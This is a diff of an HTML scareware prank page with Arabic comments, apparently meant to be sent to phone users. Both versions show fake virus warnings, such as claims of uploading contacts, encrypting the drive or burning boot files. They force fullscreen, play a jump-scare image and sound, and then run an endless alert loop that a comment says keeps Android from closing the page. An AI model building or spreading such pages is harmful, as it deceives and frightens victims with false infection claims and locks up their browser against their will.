@@ -1,87 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SYSTEM_CRITICAL_FAILURE</title>
-    <link rel="preload" as="image" href="https://i.ibb.co/39snnynW/1000016067.jpg">
+    <title>SYSTEM_FAILURE_FOUKA</title>
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; font-family: 'Courier New', monospace; }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; cursor: none; }
+        #horrorImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; display: none; z-index: 9999; }
         
-        /* واجهة رسائل الرعب النفسي */
-        #terminal { position: relative; z-index: 10; height: 100vh; padding: 20px; color: #ff0000; box-sizing: border-box; display: flex; flex-direction: column; justify-content: center; background: radial-gradient(circle, #100 0%, #000 100%); }
-        .glitch-text { font-size: 18px; text-shadow: 0 0 10px red; margin-bottom: 20px; animation: flicker 0.1s infinite; }
-        @keyframes flicker { 0% { opacity: 1; } 50% { opacity: 0.8; } 100% { opacity: 1; } }
-        
-        #countdown { font-size: 80px; text-align: center; color: #fff; text-shadow: 0 0 30px #ff0000; font-weight: bold; }
-        .warning-msg { font-size: 14px; color: #00ffff; border-left: 3px solid #ff0000; padding-left: 10px; margin-top: 20px; }
+        /* تأثير اللاق والاهتزاز */
+        .lag-effect { animation: shake 0.1s infinite; }
+        @keyframes shake { 0% { transform: translate(1px, 1px); } 50% { transform: translate(-2px, -1px); } 100% { transform: translate(1px, 2px); } }
 
-        /* ميزة الرعب: الصورة تظهر فجأة وتغطي كل شيء */
-        #scaryImage { 
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-            object-fit: cover; z-index: 9999; display: none; 
+        #warningBox { 
+            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            color: #ff0000; border: 3px solid #ff0000; padding: 30px; font-family: 'Courier New', monospace;
+            background: rgba(0,0,0,0.9); text-align: center; font-weight: bold; z-index: 100;
         }
     </style>
 </head>
-<body onclick="startInfection()">
+<body onclick="executeTotalVirus()">
 
-    <div id="terminal">
-        <div class="glitch-text">⚠️ WARNING: MALICIOUS_PROCESS_DETECTED ⚠️</div>
-        <div id="countdown">30</div>
-        <div class="warning-msg" id="logs">
-            > ACCESSING PRIVATE_GALLERY... [OK]<br>
-            > UPLOADING CONTACTS TO NODE_77... [OK]<br>
-            > SYSTEM PURGE INITIATED. DO NOT SHUT DOWN.
-        </div>
+    <div id="warningBox" class="lag-effect">
+        ⚠️ ALERT: SYSTEM_CORRUPTION_DETECTED ⚠️<br><br>
+        جاري تدمير ملفات الـ Hardware...<br>
+        [إضغط هنا لإيقاف العملية]
     </div>
-
-    <img id="scaryImage" src="https://i.ibb.co/39snnynW/1000016067.jpg">
     
-    <audio id="screamSound" src="https://www.soundboard.com/handler/DownloadTrack.ashx?cliptitle=Scary+Scream&filename=24/243645-77983652-326d-476b-9c71-29402513f56b.mp3"></audio>
+    <img id="horrorImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
+    
+    <audio id="scaryVoice" src="https://www.myinstants.com/media/sounds/tfy-krk-79938.mp3" loop></audio>
 
     <script>
-        let seconds = 30;
-        let started = false;
-
-        function startInfection() {
-            if (started) return;
-            started = true;
-
-            // تفعيل ملء الشاشة الفوري لإخفاء المتصفح
-            document.documentElement.requestFullscreen();
-
-            let timer = setInterval(() => {
-                seconds--;
-                document.getElementById('countdown').innerText = seconds;
-                
-                // إضافة رسائل مرعبة عشوائية أثناء العد
-                if(seconds % 5 == 0) {
-                    const messages = [
-                        "> ENCRYPTING HARD_DRIVE...",
-                        "> SENDING LOCATION TO DARK_WEB...",
-                        "> CAMERA_ACCESS: GRANTED.",
-                        "> DELETING SYSTEM_32..."
-                    ];
-                    document.getElementById('logs').innerHTML += "<br>" + messages[Math.floor(Math.random()*messages.length)];
-                }
-
-                if (seconds <= 0) {
-                    clearInterval(timer);
-                    triggerJumpScare();
-                }
-            }, 1000);
-        }
-
-        function triggerJumpScare() {
-            // إخفاء الواجهة وإظهار الصورة المرعبة فوراً
-            document.getElementById('terminal').style.display = 'none';
-            document.getElementById('scaryImage').style.display = 'block';
-            document.getElementById('screamSound').play();
+        function executeTotalVirus() {
+            // 1. ملء الشاشة الفوري ومنع الخروج
+            document.documentElement.requestFullscreen().catch(() => {});
             
-            // تجميد الهاتف برسائل متكررة (Infinite Loop)
+            // 2. تفعيل الصورة والصوت الإجباري
+            document.getElementById('warningBox').style.display = 'none';
+            document.getElementById('horrorImg').style.display = 'block';
+            document.getElementById('scaryVoice').play();
+
+            // 3. توليد "لاق" وهمي وضغط على المعالج برسائل Alert متتالية
             setTimeout(() => {
-                while(true) { alert("⚠️ FATAL ERROR: YOUR SOUL IS MINE NOW."); }
-            }, 100);
+                while(true) {
+                    alert("⚠️ خطأ قاتل: تم حرق ملفات الـ Boot بنجاح.");
+                    alert("FATAL_ERROR: YOUR_PHONE_IS_DYING...");
+                    alert("لا تحاول الضغط على زر الرجوع، لقد فات الأوان.");
+                    // تكرار الرسائل يمنع نظام الأندرويد من غلق الصفحة بسهولة
+                }
+            }, 300);
         }
     </script>
 </body>
